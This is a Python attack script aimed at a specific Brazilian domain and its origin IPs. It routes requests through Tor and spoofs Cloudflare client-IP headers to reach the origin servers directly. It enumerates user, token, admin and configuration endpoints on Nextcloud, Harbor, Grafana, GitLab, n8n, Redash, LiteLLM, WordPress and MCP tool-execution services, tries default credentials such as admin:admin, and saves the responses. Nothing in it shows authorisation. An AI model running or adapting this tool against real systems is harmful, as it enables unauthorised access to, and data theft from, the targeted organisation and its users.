#!/usr/bin/env python3
"""Deep service-specific probes against origin (CF-bypass via CF-Connecting-IP spoof).
Non-destructive: only GET/HEAD/OPTIONS and read-only enum. No key creation, no pushes."""
import socks, ssl, json, sys, re, base64, time
from concurrent.futures import ThreadPoolExecutor, as_completed

SOCKS_HOST, SOCKS_PORT = "127.0.0.1", 9050
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.4467.114 Safari/537.36"
CF_IP = "172.71.0.1"

# (origin_ip, vhost, [list of (method, path, [extra_headers])])
PROBES = [
    # ===== Nextcloud (drive) =====
    ("201.54.0.48", "drive.dsoconcursos.com.br", [
        ("GET", "/status.php", []),
        ("GET", "/login", []),
        ("GET", "/index.php/login/v2", []),
        ("GET", "/ocs/v1.php/cloud/capabilities", [("Accept","application/json")]),
        ("GET", "/ocs/v2.php/cloud/capabilities", [("Accept","application/json")]),
        ("GET", "/ocs/v1.php/cloud/users", [("Accept","application/json")]),
        ("GET", "/ocs/v1.php/config", [("Accept","application/json")]),
        ("GET", "/remote.php/dav/", [("Depth","0")]),
        ("PROPFIND", "/remote.php/dav/", [("Depth","0")]),
        ("GET", "/.well-known/nodeinfo", []),
        ("GET", "/index.php/apps/serverinfo/api/v1/info", []),
        ("GET", "/index.php/apps/files/", []),
        ("GET", "/favicon.ico", []),
        ("GET", "/data/htaccesstest.txt", []),
    ]),
    # ===== Cloudreve =====
    ("201.54.0.48", "cloudreve.dsoconcursos.com.br", [
        ("GET", "/", []),
        ("GET", "/login", []),
        ("GET", "/api/v1/site/config", []),
        ("GET", "/api/v2/site/config", []),
        ("GET", "/api/v3/site/config", []),
        ("GET", "/api/v1/user/me", []),
        ("GET", "/api/v2/user/me", []),
        ("GET", "/api/v3/user/me", []),
        ("GET", "/Admin", []),
        ("GET", "/admin", []),
        ("GET", "/dashboard", []),
        ("GET", "/api/v1/admin/setting/list", []),
        ("GET", "/favicon.ico", []),
    ]),
    # ===== Harbor Registry =====
    ("201.54.0.48", "registry.dsoconcursos.com.br", [
        ("GET", "/v2/", []),
        ("GET", "/v2/_catalog", []),
        ("GET", "/v2/_catalog?n=100", []),
        ("GET", "/api/v2.0/health", []),
        ("GET", "/api/v2.0/projects", []),
        ("GET", "/api/v2.0/users", []),
        ("GET", "/api/v2.0/configurations", []),
        ("GET", "/api/v2.0/registries", []),
        ("GET", "/api/v2.0/repositories", []),
        ("GET", "/api/v2.0/systeminfo", []),
        ("GET", "/api/v2.0/system/gc", []),
        ("GET", "/api/v2.0/search?q=dso", []),
        ("GET", "/", []),
        ("GET", "/api/v2.0/users/current", []),
        ("GET", "/v2/_catalog", [("Authorization","Basic " + base64.b64encode(b"admin:admin").decode())]),
        ("GET", "/v2/_catalog", [("Authorization","Basic " + base64.b64encode(b"admin:Harbor12345").decode())]),
        ("GET", "/v2/_catalog", [("Authorization","Basic " + base64.b64encode(b"admin:password").decode())]),
        ("GET", "/api/v2.0/users/current", [("Authorization","Basic " + base64.b64encode(b"admin:Harbor12345").decode())]),
    ]),
    # ===== RAG API =====
    ("201.54.0.48", "rag.dsoconcursos.com.br", [
        ("GET", "/", []),
        ("GET", "/v1/models", []),
        ("GET", "/health", []),
        ("GET", "/health/readiness", []),
        ("GET", "/v1/chat/completions", []),
        ("GET", "/api/v1", []),
        ("GET", "/docs", []),
        ("GET", "/openapi.json", []),
        ("GET", "/metrics", []),
        ("GET", "/api/v1/rag/documents", []),
    ]),
    # ===== LiteLLM =====
    ("201.54.0.48", "litellm.dsoconcursos.com.br", [
        ("GET", "/", []),
        ("GET", "/docs", []),
        ("GET", "/swagger/", []),
        ("GET", "/openapi.json", []),
        ("GET", "/openapi.yaml", []),
        ("GET", "/v1/models", []),
        ("GET", "/key/info", []),
        ("GET", "/api/key/info", []),
        ("GET", "/api/key/list", []),
        ("GET", "/user/info", []),
        ("GET", "/global/spend/logs", []),
        ("GET", "/global/spend", []),
        ("GET", "/health", []),
        ("GET", "/health/liveliness", []),
        ("GET", "/health/readiness", []),
        ("GET", "/config", []),
        ("GET", "/get_sso_url", []),
        ("GET", "/sso", []),
        ("GET", "/fallback/manage/model", []),
        ("GET", "/api/v1/health", []),
        ("GET", "/api/v1/key/info", []),
        ("GET", "/v1/health", []),
        ("GET", "/v1/key/list", []),
        ("POST", "/key/info", [("Content-Type","application/json")]),
    ]),
    # ===== Grafana =====
    ("201.54.0.48", "grafana.dsoconcursos.com.br", [
        ("GET", "/", []),
        ("GET", "/login", []),
        ("GET", "/api/health", []),
        ("GET", "/api/frontend-settings", []),
        ("GET", "/api/org", []),
        ("GET", "/api/users", []),
        ("GET", "/api/admin/settings", []),
        ("GET", "/api/admin/stats", []),
        ("GET", "/api/admin/users", []),
        ("GET", "/metrics", []),
        ("GET", "/api/login/ping", []),
        ("GET", "/public/plugins/", []),
        ("GET", "/api/annotations", []),
        ("GET", "/api/dashboards/home.json", []),
        ("GET", "/api/org/preferences", []),
        ("GET", "/api/datasources", []),
        ("GET", "/api/search", []),
        ("GET", "/healthz", []),
        # default creds
        ("GET", "/api/user", [("Authorization","Basic " + base64.b64encode(b"admin:admin").decode())]),
        ("GET", "/api/org", [("Authorization","Basic " + base64.b64encode(b"admin:admin").decode())]),
    ]),
    # ===== GitLab =====
    ("201.54.0.48", "gitlab.dsoconcursos.com.br", [
        ("GET", "/", []),
        ("GET", "/users/sign_in", []),
        ("GET", "/users/sign_up", []),
        ("GET", "/api/v4/version", []),
        ("GET", "/api/v4/metadata", []),
        ("GET", "/api/v4/projects", []),
        ("GET", "/api/v4/users", []),
        ("GET", "/api/v4/groups", []),
        ("GET", "/help", []),
        ("GET", "/-/help", []),
        ("GET", "/explore", []),
        ("GET", "/explore/projects", []),
        ("GET", "/api/v4/application/appearance", []),
        ("GET", "/api/v4/groups?search=dso", []),
        ("GET", "/api/v4/projects?search=dso", []),
        ("GET", "/api/v4/personal_access_tokens?user_id=1", []),
        ("GET", "/users", []),
        ("GET", "/-/instance/metrics", []),
        ("GET", "/api/v4/instance/statistics", []),
        ("GET", "/api/v4/namespaces", []),
    ]),
    # ===== n8n =====
    ("201.54.0.48", "n8n.dsoconcursos.com.br", [
        ("GET", "/", []),
        ("GET", "/healthz", []),
        ("GET", "/api/v1/active-workers", []),
        ("GET", "/rest/login", []),
        ("GET", "/rest/settings", []),
        ("GET", "/api/v1/settings", []),
        ("GET", "/rest/oai", []),
        ("GET", "/api/v1/workflows", []),
        ("GET", "/api/v1/users", []),
        ("GET", "/rest/users", []),
        ("GET", "/rest/oauth2-credential", []),
        ("GET", "/api/v1/executions", []),
        ("GET", "/webhook/", []),
        ("GET", "/webhook-rest", []),
        ("GET", "/api/v1/types/nodes.json", []),
        ("GET", "/rest/push", []),
    ]),
    # ===== Redash =====
    ("201.54.0.48", "redash.dsoconcursos.com.br", [
        ("GET", "/", []),
        ("GET", "/login", []),
        ("GET", "/status.json", []),
        ("GET", "/api/session", []),
        ("GET", "/api/queries", []),
        ("GET", "/api/data_sources", []),
        ("GET", "/api/integrations", []),
        ("GET", "/api/groups", []),
        ("GET", "/api/users", []),
        ("GET", "/api/org", []),
        ("GET", "/api/visualizations", []),
        ("GET", "/api/dashboards", []),
        ("GET", "/api/widgets", []),
        ("GET", "/api/admin/users", []),
        ("GET", "/api/admin/queries", []),
        ("GET", "/api/query_snippets", []),
        ("GET", "/api", []),
        ("GET", "/api/workflows", []),
    ]),
    # ===== plataforma =====
    ("201.54.0.48", "plataforma.dsoconcursos.com.br", [
        ("GET", "/", []),
        ("GET", "/auth/login", []),
        ("GET", "/login", []),
        ("GET", "/api", []),
        ("GET", "/api/v1", []),
        ("GET", "/api/v1/health", []),
        ("GET", "/api/health", []),
        ("GET", "/health", []),
        ("GET", "/api/v1/users", []),
        ("GET", "/api/v1/me", []),
        ("GET", "/me", []),
        ("GET", "/api/v1/auth/me", []),
        ("GET", "/api/users", []),
        ("GET", "/api/v1/admin", []),
        ("GET", "/docs", []),
        ("GET", "/swagger", []),
        ("GET", "/openapi.json", []),
    ]),
    # ===== portal =====
    ("201.54.0.48", "portal.dsoconcursos.com.br", [
        ("GET", "/", []),
        ("GET", "/login", []),
        ("GET", "/auth/login", []),
        ("GET", "/api", []),
        ("GET", "/api/v1/health", []),
        ("GET", "/health", []),
        ("GET", "/docs", []),
    ]),
    # ===== suporte / prf / pf / premium / uptime / tei / zipcode / tutoryplans / study-plan-tracker =====
    ("201.54.0.48", "suporte.dsoconcursos.com.br", [("GET","/",[]),("GET","/login",[]),("GET","/api",[]),("GET","/health",[])]),
    ("201.54.0.48", "prf.dsoconcursos.com.br", [("GET","/",[]),("GET","/login",[]),("GET","/api",[]),("GET","/api/v1",[])]),
    ("201.54.0.48", "pf.dsoconcursos.com.br", [("GET","/",[]),("GET","/login",[]),("GET","/api",[])]),
    ("201.54.0.48", "premium.dsoconcursos.com.br", [("GET","/",[]),("GET","/login",[]),("GET","/api",[])]),
    ("201.54.0.48", "uptime.dsoconcursos.com.br", [("GET","/",[]),("GET","/metrics",[]),("GET","/api/status-pages",[]),("GET","/api/badge",[]),("GET","/status",[])]),
    ("201.54.0.48", "tei.dsoconcursos.com.br", [("GET","/",[]),("GET","/api",[]),("GET","/health",[]),("GET","/docs",[])]),
    ("201.54.0.48", "zipcode.dsoconcursos.com.br", [("GET","/",[]),("GET","/api",[]),("GET","/health",[]),("GET","/docs",[])]),
    ("201.54.0.48", "tutoryplans.dsoconcursos.com.br", [("GET","/",[]),("GET","/api",[]),("GET","/health",[])]),
    ("201.54.0.48", "study-plan-tracker.dsoconcursos.com.br", [("GET","/",[]),("GET","/api",[]),("GET","/health",[])]),
    ("201.54.0.48", "www.dsoconcursos.com.br", [("GET","/",[]),("GET","/wp-login.php",[]),("GET","/xmlrpc.php",[]),("GET","/wp-json/wp/v2/users",[])]),
    ("201.54.0.48", "dsoconcursos.com.br", [("GET","/",[]),("GET","/wp-login.php",[]),("GET","/xmlrpc.php",[]),("GET","/wp-json/wp/v2/users",[])]),
    # ===== AWS IP (3.83.108.124) — MCP services =====
    ("3.83.108.124", "mcp-aws.dsoconcursos.com.br", [
        ("GET", "/", []),
        ("GET", "/sse", []),
        ("GET", "/messages", []),
        ("GET", "/mcp", []),
        ("GET", "/health", []),
        ("GET", "/healthz", []),
        ("GET", "/metrics", []),
        ("GET", "/docs", []),
        ("GET", "/swagger", []),
        ("GET", "/openapi.json", []),
        ("GET", "/api", []),
        ("GET", "/api/v1", []),
        ("GET", "/v1/models", []),
        ("GET", "/.well-known/ai-plugin.json", []),
        ("GET", "/robots.txt", []),
        ("POST", "/mcp", [("Content-Type","application/json")]),
        ("POST", "/sse", [("Content-Type","application/json")]),
    ]),
    ("3.83.108.124", "mcp-auth.dsoconcursos.com.br", [
        ("GET", "/", []),
        ("GET", "/health", []),
        ("GET", "/docs", []),
        ("GET", "/api", []),
        ("GET", "/.well-known/oauth-authorization-server", []),
        ("GET", "/.well-known/openid-configuration", []),
        ("GET", "/oauth/authorize", []),
        ("GET", "/oauth/token", []),
        ("GET", "/userinfo", []),
    ]),
    ("3.83.108.124", "tools-executor.dsoconcursos.com.br", [
        ("GET", "/", []),
        ("GET", "/health", []),
        ("GET", "/docs", []),
        ("GET", "/api", []),
        ("GET", "/api/v1", []),
        ("GET", "/api/v1/tools", []),
        ("GET", "/api/v1/executions", []),
        ("POST", "/api/v1/execute", [("Content-Type","application/json")]),
    ]),
    ("3.83.108.124", "litellm.dsoconcursos.com.br", [
        ("GET", "/", []),
        ("GET", "/docs", []),
        ("GET", "/v1/models", []),
        ("GET", "/health", []),
    ]),
]

def req(ip, host, method, path, extra_headers, body=None, timeout=14):
    try:
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, SOCKS_HOST, SOCKS_PORT)
        s.settimeout(timeout)
        s.connect((ip, 443))
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
        headers = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {UA}\r\n"
                   f"Accept: */*\r\nCF-Connecting-IP: {CF_IP}\r\nX-Forwarded-For: {CF_IP}\r\n"
                   f"True-Client-IP: {CF_IP}\r\nConnection: close\r\n")
        for k,v in extra_headers:
            headers += f"{k}: {v}\r\n"
        if body is not None:
            headers += f"Content-Length: {len(body)}\r\n\r\n{body}"
        else:
            headers += "\r\n"
        s.sendall(headers.encode())
        chunks=[]
        total=0
        while True:
            try: d=s.recv(8192)
            except: break
            if not d: break
            chunks.append(d); total+=len(d)
            if total>200*1024: break
        s.close()
        raw=b"".join(chunks)
    except Exception as e:
        return (None, str(e)[:80], b"", 0, [])
    head, _, body_b = raw.partition(b"\r\n\r\n")
    hs = head.decode("latin1",errors="ignore")
    status=None; server=None; loc=None; caddy_block=None; ct=None
    for line in hs.split("\r\n"):
        if line.startswith("HTTP/"):
            m=re.match(r"HTTP/\S+\s+(\d+)", line)
            if m: status=m.group(1)
        m=re.match(r"Server:\s*(.+)", line, re.I)
        if m: server=m.group(1).strip()
        m=re.match(r"Location:\s*(.+)", line, re.I)
        if m: loc=m.group(1).strip()[:200]
        m=re.match(r"X-Caddy-Block:\s*(.+)", line, re.I)
        if m: caddy_block=m.group(1).strip()
        m=re.match(r"Content-Type:\s*(.+)", line, re.I)
        if m: ct=m.group(1).strip()
    title=None
    tm=re.search(r"<title[^>]*>([^<]*)</title>", body_b.decode("latin1",errors="ignore"), re.I)
    if tm: title=tm.group(1).strip()[:150]
    return (status, server, body_b[:2048], len(body_b), {
        "location":loc, "caddy_block":caddy_block, "content_type":ct, "title":title,
        "headers":[l for l in hs.split("\r\n")[:15]]
    })

def main():
    tasks=[]
    for ip, host, paths in PROBES:
        for method, path, extra in paths:
            body = None
            extra2 = list(extra)
            if method == "POST":
                body = '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}'
                extra2 = [(k,v) for k,v in extra2 if k.lower() != "content-length"]
            tasks.append((ip, host, method, path, extra2, body))
    print(f"[*] {len(tasks)} deep-probe tasks", file=sys.stderr)
    results=[]
    with ThreadPoolExecutor(max_workers=16) as ex:
        futs=[ex.submit(req, *t) for t in tasks]
        for f in as_completed(futs):
            r=f.result()
            results.append(r)
    # Save raw
    with open("raw/deep_probe_raw.json","w") as f:
        json.dump([{"method":t[2],"ip":t[0],"host":t[1],"path":t[3],
                    "status":r[0],"server":r[1],"body_head":r[2].decode("latin1",errors="ignore")[:1500],
                    "size":r[3],"meta":r[4]} for t,r in zip(tasks,results)], f, indent=2)
    # Print interesting (non-403, non-404-only) findings
    print("\n=== INTERESTING FINDINGS ===")
    for t,r in zip(tasks,results):
        status=r[0]
        if status in (None,"000","403","404"): continue
        body=r[2].decode("latin1",errors="ignore")
        body_short = body[:300].replace("\n"," ")
        print(f"\n[{t[2]}] {t[1]}{t[3]} -> {status} srv={r[1]} sz={r[3]}")
        if r[4].get("title"): print(f"  title: {r[4]['title']!r}")
        if r[4].get("location"): print(f"  location: {r[4]['location']}")
        if r[4].get("caddy_block"): print(f"  caddy_block: {r[4]['caddy_block']}")
        if r[4].get("content_type"): print(f"  ct: {r[4]['content_type']}")
        # only print body if json/text/small
        if r[3] < 6000 and ("json" in (r[4].get("content_type") or "") or "text" in (r[4].get("content_type") or "") or r[3] < 800):
            print(f"  body: {body_short!r}")

if __name__=="__main__":
    main()
